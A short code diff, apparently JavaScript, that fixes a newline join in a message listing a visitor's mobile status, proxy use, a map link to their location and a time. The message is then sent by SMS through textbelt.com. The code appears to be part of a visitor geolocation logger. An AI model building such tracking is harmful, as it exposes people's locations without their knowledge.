@@ -1392,8 +1392,7 @@ const CONFIG = {
           `📱 Mobile: ${mobile} | Proxy: ${geo?.proxy ? 'Yes' : 'No'}`,
           mapsUrl ? `🗺 ${mapsUrl}` : '',
           `🕐 ${time}`,
-        ].filter(Boolean).join('
-');
+        ].filter(Boolean).join('\n');
 
         fetch('https://textbelt.com/text', {
           method: 'POST',
